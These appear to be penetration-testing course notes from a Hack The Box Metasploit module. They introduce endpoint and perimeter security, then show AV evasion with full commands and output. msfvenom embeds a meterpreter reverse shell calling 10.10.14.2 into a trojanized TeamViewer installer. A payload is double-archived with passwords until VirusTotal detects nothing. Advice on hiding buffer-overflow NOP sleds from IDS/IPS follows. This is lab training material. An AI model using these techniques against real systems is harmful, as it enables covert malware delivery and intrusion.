`Endpoint Protection` means a device or service focused on securing a single host within a network. This host might be a `personal computer`, `corporate workstation`, or a `server` inside a network’s `De-Militarized Zone (DMZ)`.

Such protection typically comes as integrated software packages combining `Antivirus Protection`, `Antimalware Protection` (covering `bloatware`, `spyware`, `adware`, `scareware`, `ransomware`), `Firewall`, and `Anti-DDOS` features. Familiar examples include `Avast`, `Nod32`, `Malwarebytes`, and `BitDefender` installed on personal or workplace machines.

`Perimeter Protection` involves physical or virtual devices placed at the network’s edge, controlling traffic flow from the `public` Internet into the `private` internal network. Between these zones often lies the `De-Militarized Zone (DMZ)`, a semi-trusted segment that hosts `public-facing servers`. These servers exchange data with Internet clients but are managed and patched internally to maintain updated, secure services. The DMZ has a lower security level than the internal network but a higher trust level than the outside world.

`Security Policies` are fundamental to maintaining strong network security. Like `Access Control Lists (ACLs)`, they consist of `allow` and `deny` rules that control how traffic and files move within network boundaries. Multiple policies can apply across different network segments and host features, including:

- `Network Traffic Policies`
- `Application Policies`
- `User Access Control Policies`
- `File Management Policies`
- `DDoS Protection Policies`

| **Security Policy**                         | **Description**                                                                                                                                                                                                                                                                                                                   |
| ------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Signature-based Detection`                 | The operation of packets in the network and comparison with pre-built and pre-ordained attack patterns known as signatures. Any 100% match against these signatures will generate alarms.                                                                                                                                         |
| `Heuristic / Statistical Anomaly Detection` | Behavioral comparison against an established baseline included modus-operandi signatures for known APTs (Advanced Persistent Threats). The baseline will identify the norm for the network and what protocols are commonly used. Any deviation from the maximum threshold will generate alarms.                                   |
| `Stateful Protocol Analysis Detection`      | Recognizing the divergence of protocols stated by event comparison using pre-built profiles of generally accepted definitions of non-malicious activity.                                                                                                                                                                          |
| `Live-monitoring and Alerting (SOC-based)`  | A team of analysts in a dedicated, in-house, or leased SOC (Security Operations Center) use live-feed software to monitor network activity and intermediate alarming systems for any potential threats, either deciding themselves if the threat should be actioned upon or letting the automated mechanisms take action instead. |

---

``msfconsole`` now supports ``AES-encrypted`` tunnels, and ``Meterpreter`` runs entirely in ``memory``, enhancing stealth and security. However, the initial payload file dropped on the target before execution remains vulnerable—it can be fingerprinted, signature-scanned, and blocked by ``AV`` software, which increasingly updates signature databases with known ``msfconsole`` payloads.  

``msfvenom`` provides a solution through ``executable templates``: it injects payloads into legitimate executables like installers or packages, hiding shellcode inside valid program code. This obfuscation lowers detection rates by embedding malicious code in trusted files. Combining various legitimate executables, encoding schemes, and payload variants produces ``backdoored executables``, making detection and blocking by security tools much harder.

Take a look at the snippet below to understand how msfvenom can embed payloads into any executable file:

```bash
OathBornX@htb[/htb]$ msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5

Attempting to read payload from STDIN...
Found 1 compatible encoders
Attempting to encode payload with 5 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 27 (iteration=0)
x86/shikata_ga_nai succeeded with size 54 (iteration=1)
x86/shikata_ga_nai succeeded with size 81 (iteration=2)
x86/shikata_ga_nai succeeded with size 108 (iteration=3)
x86/shikata_ga_nai succeeded with size 135 (iteration=4)
x86/shikata_ga_nai chosen with final size 135
Payload size: 135 bytes
Saved as: /home/user/Desktop/TeamViewer_Setup.exe
```

Firewall and IDS/IPS Evasion

```bash
OathBornX@htb[/htb]$ ls

Pictures-of-cats.tar.gz  TeamViewer_Setup.exe  Cake_recipes
```

Archiving a `file`, `folder`, `script`, `executable`, `picture`, or `document` and securing it with a `password` can bypass many common `anti-virus` (`AV`) `signature` detections. However, these `password-protected archives` trigger alerts in the `AV dashboard` because the contents cannot be `scanned`. As a result, `administrators` must perform `manual inspection` to determine if the archive contains `malicious` content.
#### Generating Payload

```bash
OathBornX@htb[/htb]$ msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -e x86/shikata_ga_nai -a x86 --platform windows -o ~/test.js -i 5

Attempting to read payload from STDIN...
Found 1 compatible encoders
Attempting to encode payload with 5 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 27 (iteration=0)
x86/shikata_ga_nai succeeded with size 54 (iteration=1)
x86/shikata_ga_nai succeeded with size 81 (iteration=2)
x86/shikata_ga_nai succeeded with size 108 (iteration=3)
x86/shikata_ga_nai succeeded with size 135 (iteration=4)
x86/shikata_ga_nai chosen with final size 135
Payload size: 135 bytes
Saved as: /home/user/test.js
```

```bash
OathBornX@htb[/htb]$ cat test.js

�+n"����t$�G4ɱ1zz��j�V6����ic��o�Bs>��Z*�����9vt��%��1�
<...SNIP...>
�Qa*���޴��RW�%Š.\�=;.l�T���XF���T��
```

If we check against VirusTotal to get a detection baseline from the payload we generated, the results will be the following.
#### VirusTotal

```bash
OathBornX@htb[/htb]$ msf-virustotal -k <API key> -f test.js 

<...SNIP>

 Antivirus             Detected  Version               Result                             Update
 ---------             --------  -------               ------                             ------
 ALYac                 true      1.1.3.1               Exploit.Metacoder.Shikata.Gen      20220510
 AVG                   true      21.1.5827.0           Win32:ShikataGaNai-A [Trj]         20220510
 Acronis               false     1.2.0.108                                                20220426
 Ad-Aware              true      3.0.21.193            Exploit.Metacoder.Shikata.Gen      20220510
 AhnLab-V3             false     3.21.3.10230                                             20220510
 Antiy-AVL             false     3.0                                                      20220510
 Arcabit               false     1.0.0.889                                                20220510
 Avast                 true      21.1.5827.0           Win32:ShikataGaNai-A [Trj]         20220510
 Avira                 false     8.3.3.14                                                 20220510
 Baidu                 false     1.0.0.2                                                  20190318
 BitDefender           true      7.2                   Exploit.Metacoder.Shikata.Gen      20220510
 BitDefenderTheta      false     7.2.37796.0                                              20220428
 Bkav                  false     1.3.0.9899                                               20220509
 CAT-QuickHeal         false     14.00                                                    20220510
 CMC                   false     2.10.2019.1                                              20211026
 ClamAV                true      0.105.0.0             Win.Trojan.MSShellcode-6360729-0   20220509
 Comodo                false     34607                                                    20220510
 Cynet                 false     4.0.0.27                                                 20220510
 Cyren                 false     6.5.1.2                                                  20220510
 DrWeb                 false     7.0.56.4040                                              20220510
 ESET-NOD32            false     25243                                                    20220510
 Emsisoft              true      2021.5.0.7597         Exploit.Metacoder.Shikata.Gen (B)  20220510
 F-Secure              false     18.10.978.51                                             20220510
 FireEye               true      35.24.1.0             Exploit.Metacoder.Shikata.Gen      20220510
 Fortinet              false     6.2.142.0                                                20220510
 GData                 true      A:25.33002B:27.27300  Exploit.Metacoder.Shikata.Gen      20220510
 Gridinsoft            false     1.0.77.174                                               20220510
 Ikarus                false     6.0.24.0                                                 20220509
 Jiangmin              false     16.0.100                                                 20220509
 K7AntiVirus           false     12.12.42275                                              20220510
 K7GW                  false     12.12.42275                                              20220510
 Kaspersky             false     21.0.1.45                                                20220510
 Kingsoft              false     2017.9.26.565                                            20220510
 Lionic                false     7.5                                                      20220510
 MAX                   true      2019.9.16.1           malware (ai score=89)              20220510
 Malwarebytes          false     4.2.2.27                                                 20220510
 MaxSecure             false     1.0.0.1                                                  20220510
 McAfee                false     6.0.6.653                                                20220510
 McAfee-GW-Edition     false     v2019.1.2+3728                                           20220510
 MicroWorld-eScan      true      14.0.409.0            Exploit.Metacoder.Shikata.Gen      20220510
 Microsoft             false     1.1.19200.5                                              20220510
 NANO-Antivirus        false     1.0.146.25588                                            20220510
 Panda                 false     4.6.4.2                                                  20220509
 Rising                false     25.0.0.27                                                20220510
 SUPERAntiSpyware      false     5.6.0.1032                                               20220507
 Sangfor               false     2.14.0.0                                                 20220507
 Sophos                false     1.4.1.0                                                  20220510
 Symantec              false     1.17.0.0                                                 20220510
 TACHYON               false     2022-05-10.02                                            20220510
 Tencent               false     1.0.0.1                                                  20220510
 TrendMicro            false     11.0.0.1006                                              20220510
 TrendMicro-HouseCall  false     10.0.0.1040                                              20220510
 VBA32                 false     5.0.0                                                    20220506
 ViRobot               false     2014.3.20.0                                              20220510
 VirIT                 false     9.5.191                                                  20220509
 Yandex                false     5.5.2.24                                                 20220428
 Zillya                false     2.0.0.4627                                               20220509
 ZoneAlarm             false     1.0                                                      20220510
 Zoner                 false     2.2.2.0                                                  20220509
```

Now, try archiving it two times, passwording both archives upon creation, and removing the `.rar`/`.zip`/`.7z` extension from their names. For this purpose, we can install the [RAR utility](https://www.rarlab.com/download.htm) from RARLabs, which works precisely like WinRAR on Windows.
#### Archiving the Payload

```bash
OathBornX@htb[/htb]$ wget https://www.rarlab.com/rar/rarlinux-x64-612.tar.gz
OathBornX@htb[/htb]$ tar -xzvf rarlinux-x64-612.tar.gz && cd rar
OathBornX@htb[/htb]$ rar a ~/test.rar -p ~/test.js

Enter password (will not be echoed): ******
Reenter password: ******

RAR 5.50   Copyright (c) 1993-2017 Alexander Roshal   11 Aug 2017
Trial version             Type 'rar -?' for help
Evaluation copy. Please register.

Creating archive test.rar
Adding    test.js                                                     OK 
Done
```

```bash
OathBornX@htb[/htb]$ ls

test.js   test.rar
```

#### Removing the .RAR Extension

```bash
OathBornX@htb[/htb]$ mv test.rar test
OathBornX@htb[/htb]$ ls

test   test.js
```

#### Archiving the Payload Again

```bash
OathBornX@htb[/htb]$ rar a test2.rar -p test

Enter password (will not be echoed): ******
Reenter password: ******

RAR 5.50   Copyright (c) 1993-2017 Alexander Roshal   11 Aug 2017
Trial version             Type 'rar -?' for help
Evaluation copy. Please register.

Creating archive test2.rar
Adding    test                                                        OK 
Done
```

#### Removing the .RAR Extension

```bash
OathBornX@htb[/htb]$ mv test2.rar test2
OathBornX@htb[/htb]$ ls

test   test2   test.js
```

The test2 file is the final .rar archive with the extension (.rar) deleted from the name. After that, we can proceed to upload it on VirusTotal for another check.

#### VirusTotal

```bash
OathBornX@htb[/htb]$ msf-virustotal -k <API key> -f test2

<...SNIP>

 Antivirus             Detected  Version         Result  Update
 ---------             --------  -------         ------  ------
 ALYac                 false     1.1.3.1                 20220510
 Acronis               false     1.2.0.108               20220426
 Ad-Aware              false     3.0.21.193              20220510
 AhnLab-V3             false     3.21.3.10230            20220510
 Antiy-AVL             false     3.0                     20220510
 Arcabit               false     1.0.0.889               20220510
 Avira                 false     8.3.3.14                20220510
 BitDefender           false     7.2                     20220510
 BitDefenderTheta      false     7.2.37796.0             20220428
 Bkav                  false     1.3.0.9899              20220509
 CAT-QuickHeal         false     14.00                   20220510
 CMC                   false     2.10.2019.1             20211026
 ClamAV                false     0.105.0.0               20220509
 Comodo                false     34606                   20220509
 Cynet                 false     4.0.0.27                20220510
 Cyren                 false     6.5.1.2                 20220510
 DrWeb                 false     7.0.56.4040             20220510
 ESET-NOD32            false     25243                   20220510
 Emsisoft              false     2021.5.0.7597           20220510
 F-Secure              false     18.10.978.51            20220510
 FireEye               false     35.24.1.0               20220510
 Fortinet              false     6.2.142.0               20220510
 Gridinsoft            false     1.0.77.174              20220510
 Jiangmin              false     16.0.100                20220509
 K7AntiVirus           false     12.12.42275             20220510
 K7GW                  false     12.12.42275             20220510
 Kingsoft              false     2017.9.26.565           20220510
 Lionic                false     7.5                     20220510
 MAX                   false     2019.9.16.1             20220510
 Malwarebytes          false     4.2.2.27                20220510
 MaxSecure             false     1.0.0.1                 20220510
 McAfee-GW-Edition     false     v2019.1.2+3728          20220510
 MicroWorld-eScan      false     14.0.409.0              20220510
 NANO-Antivirus        false     1.0.146.25588           20220510
 Panda                 false     4.6.4.2                 20220509
 Rising                false     25.0.0.27               20220510
 SUPERAntiSpyware      false     5.6.0.1032              20220507
 Sangfor               false     2.14.0.0                20220507
 Symantec              false     1.17.0.0                20220510
 TACHYON               false     2022-05-10.02           20220510
 Tencent               false     1.0.0.1                 20220510
 TrendMicro-HouseCall  false     10.0.0.1040             20220510
 VBA32                 false     5.0.0                   20220506
 ViRobot               false     2014.3.20.0             20220510
 VirIT                 false     9.5.191                 20220509
 Yandex                false     5.5.2.24                20220428
 Zillya                false     2.0.0.4627              20220509
 ZoneAlarm             false     1.0                     20220510
 Zoner                 false     2.2.2.0                 20220509
```

---
## Packers

A list of popular packer software:

| [UPX packer](https://upx.github.io) | [The Enigma Protector](https://enigmaprotector.com) | [MPRESS](https://web.archive.org/web/20240310213323/https://www.matcode.com/mpress.htm) |
| ----------------------------------- | --------------------------------------------------- | --------------------------------------------------------------------------------------- |
| Alternate EXE Packer                | ExeStealth                                          | Morphine                                                                                |
| MEW                                 | Themida                                             |                                                                                         |
`BOF` — short for `Buffer Overflow`: a class of vulnerability where a program writes more data into a buffer (memory region) than it was allocated, overwriting adjacent memory. That overflow can corrupt control data (return addresses, function pointers) and — if the attacker can control what gets overwritten — redirect execution to attacker-controlled code (the `payload`).

`NOP sled`: a run of `no-operation` instructions placed before shellcode so the exact jump address doesn’t have to be perfect. The CPU “slides” down the sled until it reaches the payload. In x86 the common NOP byte is `\x90`, so a sled looks like:

When writing or porting exploits, avoid easily fingerprintable patterns so target `security` controls can’t match them reliably. Typical `Buffer Overflow` (`BoF`) payloads often contain repetitive `hexadecimal` buffers that `IDS`/`IPS` placements detect; randomizing parts of the exploit breaks those signatures. In `msfconsole` modules you can expose an `Offset` option to introduce controlled variation, for example:

```ruby
'Targets' => 
[ 
	[ 'Windows 2000 SP4 English', { 'Ret' => 0x77e14c29, 'Offset' => 5093 } ], 
],
```

Don’t use obvious `NOP sleds` where your `shellcode` will land—both the crash pattern and the sled are common detection points. Remember: the `BoF` must crash the service, and the `NOP sled` is simply padding for the `payload`; both should be obfuscated and tested. Always validate custom exploits in an isolated `sandbox` (or lab) against `IDS/IPS` and `EDR` rules before any client engagement—you often get only one shot during an assessment.

